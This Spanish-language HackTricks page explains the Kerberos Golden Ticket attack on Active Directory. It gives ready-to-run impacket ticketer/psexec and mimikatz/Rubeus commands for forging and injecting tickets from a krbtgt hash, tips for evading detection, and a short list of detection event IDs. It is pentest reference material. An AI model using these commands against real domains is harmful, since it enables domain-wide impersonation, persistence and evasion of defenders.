# Golden Ticket

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Golden ticket

Se puede crear un **TGT válido como cualquier usuario** **usando el hash NTLM de la cuenta krbtgt de AD**. La ventaja de falsificar un TGT en lugar de un TGS es la capacidad de **acceder a cualquier servicio** (o máquina) en el dominio y el usuario suplantado.\
Además, las **credenciales** de **krbtgt** **nunca** se **cambian** automáticamente.

El **hash NTLM** de la cuenta **krbtgt** se puede **obtener** del **proceso lsass** o del archivo **NTDS.dit** de cualquier DC en el dominio. También es posible obtener ese NTLM a través de un **ataque DCsync**, que se puede realizar con el módulo [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) de Mimikatz o el ejemplo de impacket [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Por lo general, se requieren **privilegios de administrador de dominio o similares**, independientemente de la técnica utilizada.

También se debe tener en cuenta que es posible Y **PREFERIBLE** (opsec) **falsificar tickets usando las claves Kerberos AES (AES128 y AES256)**.

{% code title="Desde Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
```markdown
{% endcode %}

{% code title="Desde Windows" %}
```
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Una vez** que hayas inyectado el **golden Ticket**, podrás acceder a los archivos compartidos **(C$)**, y ejecutar servicios y WMI, por lo que podrías usar **psexec** o **wmiexec** para obtener una shell (parece que no se puede obtener una shell a través de winrm).

### Evadiendo detecciones comunes

Las formas más frecuentes de detectar un golden ticket son mediante la **inspección del tráfico Kerberos** en la red. Por defecto, Mimikatz **firma el TGT por 10 años**, lo que resaltará como anómalo en las subsiguientes solicitudes de TGS realizadas con él.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utiliza los parámetros `/startoffset`, `/endin` y `/renewmax` para controlar el desfase inicial, la duración y las renovaciones máximas (todo en minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Lamentablemente, la vida útil del TGT no se registra en los eventos 4769, por lo que no encontrarás esta información en los registros de eventos de Windows. Sin embargo, lo que puedes correlacionar es **ver eventos 4769** _**sin**_ **un 4768 previo**. **No es posible solicitar un TGS sin un TGT**, y si no hay registro de que se haya emitido un TGT, podemos inferir que fue falsificado sin conexión.

Para **evitar esta detección** revisa los tickets diamante:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigación

* 4624: Inicio de sesión de cuenta
* 4672: Inicio de sesión de administrador
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Otro pequeño truco que pueden hacer los defensores es **alertar sobre eventos 4769 para usuarios sensibles** como la cuenta de administrador de dominio predeterminada.

[**Más información sobre Golden Ticket en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
